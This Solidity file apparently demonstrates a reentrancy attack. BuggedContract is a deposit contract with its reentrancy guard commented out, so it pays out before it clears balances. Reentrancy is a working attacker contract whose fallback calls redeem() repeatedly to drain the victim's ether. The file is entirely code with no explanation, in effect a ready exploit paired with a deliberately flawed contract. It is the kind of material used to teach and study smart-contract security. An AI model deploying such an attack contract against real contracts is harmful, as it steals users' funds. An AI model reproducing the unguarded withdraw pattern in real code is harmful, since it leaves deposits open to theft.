// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.17;

contract BuggedContract {
    mapping(address => uint) public balances;

    // bool guard;

    function store() public payable {
        balances[msg.sender] += msg.value;
    }

    function redeem() public {
        // require(guard == false, "Reentrancy");

        // guard = true;
        msg.sender.call{ value: balances[msg.sender] }("");
        balances[msg.sender] = 0;
        // guard = false;
    }
}

contract Reentrancy {
    BuggedContract public buggedContract;

    constructor(address _buggedContract) {
        buggedContract = BuggedContract(_buggedContract);
    }

    fallback() external payable {
        if(address(buggedContract).balance >= 1 ether) {
            buggedContract.redeem();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        buggedContract.store{value: 1 ether}();
        buggedContract.redeem();
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}